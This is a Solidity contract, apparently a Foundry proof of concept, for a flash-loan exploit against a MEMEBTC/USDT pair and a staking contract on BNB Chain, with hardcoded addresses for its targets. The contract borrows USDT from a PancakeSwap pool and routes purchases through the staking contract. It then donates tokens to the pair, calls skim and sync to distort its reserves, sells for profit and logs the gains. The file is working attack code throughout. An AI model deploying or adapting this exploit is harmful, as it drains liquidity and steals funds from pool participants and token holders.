//SPDX-License-Identifier: None
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "forge-std/console.sol";

import "@interfaces/IUniswapV2Router.sol";
import "@interfaces/IUniswapV3PoolActions.sol";
import "@interfaces/IPancakeV3FlashCallback.sol";

interface Staking {
    function totalItems() external returns (uint256);
    function bind(address referrer) external;
    function stake(uint256 amount) external;
    function claim(uint256 id) external;
}

contract Bot is Ownable, IPancakeV3FlashCallback {
    IUniswapV3PoolActions public USDT_WBNB_POOL = IUniswapV3PoolActions(0x36696169C63e42cd08ce11f5deeBbCeBae652050);

    IUniswapV2Router public constant UNISWAP_ROUTER = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    IUniswapV2Pair public constant USDT_MEMEBTC_PAIR = IUniswapV2Pair(0xD1C2d8bBBa177A3bC9cc343f6688d92ed1E20b10);

    ERC20 public constant USDT = ERC20(0x55d398326f99059fF775485246999027B3197955);
    ERC20 public constant MEMEBTC = ERC20(0x794baD5ea0b8d41be5cFD3F83919A83D3C788888);
    ERC20 public constant BTCDOGE = ERC20(0x91d7389655e2aad778930bba6077C5d1dbf7FC47);

    Staking public constant STAKING = Staking(0x4E5c4fFAdf8e710D7fFE39EE75cc2233088215f9);
    address public constant STAKING_REFERRER = address(0xf0ed755609733859B646F91E23e7E75c1E28f4c9);

    uint256 public stakeId;

    constructor() Ownable(msg.sender) {}

    receive() external payable {}

    function withdrawERC20(address erc20, address to) public onlyOwner {
        IERC20(erc20).transfer(to, IERC20(erc20).balanceOf(address(this)));
    }

    function withdrawETH(address payable to) public onlyOwner {
        to.transfer(address(this).balance);
    }

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        address recipient
    ) public {
        IERC20(tokenIn).approve(address(UNISWAP_ROUTER), amountIn);
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        UNISWAP_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 0, path, recipient, block.timestamp
        );
        IERC20(tokenIn).approve(address(UNISWAP_ROUTER), 0);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256, bytes calldata data) external {
        (uint256 borrowAmount) = abi.decode(data, (uint256));

        console.log("Before buy");
        console.log("Pool USDT balance =>", USDT.balanceOf(address(USDT_MEMEBTC_PAIR)) / 1 ether);
        console.log("Pool MEMEBTC balance =>", MEMEBTC.balanceOf(address(USDT_MEMEBTC_PAIR)) / 1 ether);
        console.log();

        swapExactTokensForTokensSupportingFeeOnTransferTokens(
            address(USDT), address(MEMEBTC), USDT.balanceOf(address(this)), address(STAKING)
        );

        console.log("After buy");
        console.log("Before donate");
        console.log("Pool USDT balance =>", USDT.balanceOf(address(USDT_MEMEBTC_PAIR)) / 1 ether);
        console.log("Pool MEMEBTC balance =>", MEMEBTC.balanceOf(address(USDT_MEMEBTC_PAIR)) / 1 ether);
        console.log("Bot USDT balance =>", USDT.balanceOf(address(this)) / 1 ether);
        console.log("Bot MEMEBTC balance =>", MEMEBTC.balanceOf(address(this)) / 1 ether);
        console.log();

        uint256 donateAmount = MEMEBTC.balanceOf(address(USDT_MEMEBTC_PAIR)) * 2999 / 10000;
        MEMEBTC.transfer(address(USDT_MEMEBTC_PAIR), donateAmount);

        console.log("After donate");
        console.log("Before skim");
        console.log("Pool USDT balance =>", USDT.balanceOf(address(USDT_MEMEBTC_PAIR)) / 1 ether);
        console.log("Pool MEMEBTC balance =>", MEMEBTC.balanceOf(address(USDT_MEMEBTC_PAIR)) / 1 ether);
        console.log("Bot USDT balance =>", USDT.balanceOf(address(this)) / 1 ether);
        console.log("Bot MEMEBTC balance =>", MEMEBTC.balanceOf(address(this)) / 1 ether);
        console.log();

        USDT_MEMEBTC_PAIR.skim(address(this));
        USDT_MEMEBTC_PAIR.sync();

        console.log("After skim");
        console.log("Before sell");
        console.log("Pool USDT balance =>", USDT.balanceOf(address(USDT_MEMEBTC_PAIR)) / 1 ether);
        console.log("Pool MEMEBTC balance =>", MEMEBTC.balanceOf(address(USDT_MEMEBTC_PAIR)) / 1 ether);
        console.log("Bot USDT balance =>", USDT.balanceOf(address(this)) / 1 ether);
        console.log("Bot MEMEBTC balance =>", MEMEBTC.balanceOf(address(this)) / 1 ether);
        console.log();

        swapExactTokensForTokensSupportingFeeOnTransferTokens(
            address(MEMEBTC), address(USDT), MEMEBTC.balanceOf(address(this)), address(this)
        );

        console.log("After sell");
        console.log("Pool USDT balance =>", USDT.balanceOf(address(USDT_MEMEBTC_PAIR)) / 1 ether);
        console.log("Pool MEMEBTC balance =>", MEMEBTC.balanceOf(address(USDT_MEMEBTC_PAIR)) / 1 ether);
        console.log("Bot USDT balance =>", USDT.balanceOf(address(this)) / 1 ether);
        console.log("Bot MEMEBTC balance =>", MEMEBTC.balanceOf(address(this)) / 1 ether);
        console.log();

        require(USDT.balanceOf(address(this)) > borrowAmount + fee0, "No profit");

        USDT.transfer(address(USDT_WBNB_POOL), borrowAmount + fee0);
    }

    function main(uint256 flashLoanAmount, address withdrawAddress) public onlyOwner {
        flashLoanAmount = flashLoanAmount * 1 ether;

        bytes memory params = abi.encode(flashLoanAmount);

        USDT_WBNB_POOL.flash(address(this), flashLoanAmount, 0, params);

        USDT.transfer(withdrawAddress, USDT.balanceOf(address(this)));

        console.log("Profit =>", (USDT.balanceOf(withdrawAddress)) / 1 ether);
        console.log();
    }

    function bind() public onlyOwner {
        STAKING.bind(STAKING_REFERRER);
    }

    function stake(uint256 amount) public onlyOwner {
        amount *= 10 ** USDT.decimals();

        swapExactTokensForTokensSupportingFeeOnTransferTokens(
            address(USDT), address(BTCDOGE), amount * 30 / 100, address(this)
        );

        BTCDOGE.approve(address(STAKING), BTCDOGE.balanceOf(address(this)));

        USDT.approve(address(STAKING), USDT.balanceOf(address(this)));

        STAKING.stake(amount);

        stakeId = STAKING.totalItems();
    }

    function claim() public onlyOwner {
        STAKING.claim(stakeId);
    }
}
